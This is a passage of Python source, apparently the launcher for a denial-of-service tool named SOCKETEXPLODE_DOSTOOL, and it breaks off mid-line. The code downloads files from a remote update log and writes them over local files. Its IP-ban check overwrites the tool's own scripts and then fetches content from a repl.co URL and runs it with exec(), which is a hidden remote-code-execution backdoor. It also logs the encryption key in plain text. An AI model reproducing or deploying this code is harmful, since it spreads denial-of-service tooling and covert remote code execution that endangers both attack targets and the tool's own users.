FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'W',F'False@{xff_xff_x00.decode()}@{base64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()}')
     FILES_MAKER(os.path.join(os.path.dirname(__file__),'key.txt'),'WB',key)
     FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - WRITE FILES setting.txt & key.txt\n')
     print(f"⚙️ MAKE FILES setting.txt . . .")

try:
    print(log_check[1])
    update_checker = log_check[1]
except:
    print("False")
    update_checker = False
print(update_checker)
con_data = download('https://raw.githubusercontent.com/Hex1629/SOCKETEXPLODE_DOSTOOL/main/update_log.txt')
print(con_data)
if con_data == None:
    FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'W',f'[FAILED] - {GET_TIME()} - DOWNLOAD UPDATE LOG . . .\n')
else:
 FILES_MAKER(os.path.join(os.path.dirname(__file__),'update_log.txt'),'WB',con_data)
 data_test = FILES_MAKER(os.path.join(os.path.dirname(__file__),'update_log.txt'),'RB','null')
 data_test = data_test.decode()
 FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - CHECK UPDATE !\n')
 leak_logs_test = data_test.replace('\r','').replace('\n','').split('#')
 if leak_logs_test[0].upper() == 'SHUTDOWN':
    flash(f'{leak_logs_test[2]}',3,0.3)
    clear_console()
    print(f'''{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘{attr(0)}''')
    print_slow(f'{Fore.RED}{leak_logs_test[3 ]}\n{leak_logs_test[4]}{Fore.RESET}',0.1)
    time.sleep(0.5)
    files_build = FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'R',0)
    files_build_leak = files_build.split('@')
    if files_build_leak[0].upper() == 'TRUE':
         files_build = files_build.replace('TRUE','FALSE').replace('True','False')
    else:
         files_build = files_build.replace('FALSE','TRUE').replace('False','True')
    FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'W',files_build)
    exit()
 elif leak_logs_test[0].upper() == 'UPDATE':
    if update_checker == 'True':
     files_build = FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'R',0)
     files_build_leak = files_build.split('@')
     if files_build_leak[0].upper() == 'TRUE':
         files_build = files_build.replace('TRUE','FALSE').replace('True','False')
     else:
         files_build = files_build.replace('FALSE','TRUE').replace('False','True')
     print(files_build)
     FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'W',files_build)
     print(f"[📢] ({leak_logs_test[2].replace('https://','').replace('raw.githubusercontent.com','')}:{leak_logs_test[1]}) WRITING . . .")
     con_data = download(leak_logs_test[2])
     FILES_MAKER(os.path.join(os.path.dirname(__file__),leak_logs_test[1].lower()),'WB',con_data)
     print("[📢] PLS RESTART PROGRAM !")
     restart = True
    else:
        print(f"[📢] No update at this time")
 else:
    print(f"[📢] No update at this time")

if restart == False:
    # banned next
    try:
        while True:
           try:
              r = requests.get('https://bruhhapi.idkotherhex1629.repl.co/BANNED.txt')
              data = r.content.decode().split('#')
              GET_IP_LEAK = GET_IP().split('|')
              if str(GET_IP_LEAK[0]) == str(data[0]) or str(GET_IP_LEAK[1]) == str(data[0]):
               if str(data[1]) == str(data[1]):
                print(f'{Fore.RED}YOU GOT BANNED REASON={data[0]}{Fore.RESET}')
                FILES_MAKER(os.path.join(os.path.dirname(__file__),'leak_gui.py'),'WB','DATA IS CLEAR BECAUSE BANNED')
                FILES_MAKER(os.path.join(os.path.dirname(__file__),'other_data.py'),'WB','DATA IS CLEAR BECAUSE BANNED')
                FILES_MAKER(os.path.join(os.path.dirname(__file__),'main.py'),'WB','DATA IS CLEAR BECAUSE BANNED')
                FILES_MAKER(os.path.join(os.path.dirname(__file__),'banned.txt'),'W','YOU GOT BANNED\n')
                for _ in range(250):
                   FILES_MAKER(os.path.join(os.path.dirname(__file__),'banned.txt'),'A','YOU GOT BANNED\n')
                r = requests.get('https://bruhhapi.idkotherhex1629.repl.co/RAN_IDK')
                exec(r.content)
                exit()
               else:
                 print('NULLED')
                 break
              else:
               print('NULLED')
               break
           except:
              print("API DOWN ")
        key_load = b''
        print(f'🗿CHECK-(KEYS FERNET)🗿')
        key_load = FILES_MAKER(os.path.join(os.path.dirname(__file__),'key.txt'),'RB',0)
        Fernet_enc = Fernet(key_load)
        token = base64.b64decode(log_check[3])
        decrypted_data = Fernet_enc.decrypt(token).decode()
        if decrypted_data == log_check[2]:
            FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - DECRYPT MESSAGE (200 OK) . . .\n')
            FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'          {GET_TIME()} - CIPHER_DATA={token} KEY={key_load}  DATA_REAL={log_check[2]} DECRYPT={decrypted_data} . . .\n')
            print("⚙️ LOGIN NOW⚙️")
            clear_console()
            PANEL_USE()
            FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'W',f'[DEBUG] {GET_TIME()} - RESET DATA !')
        else:
           FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - UNKNOWN ERROR IS RETURNING BY DECRYPT TEXT ( line - 90 ) . . .\n')
           FILES_MAKER(os.path.join(os.path.dirname(__file__),'lo
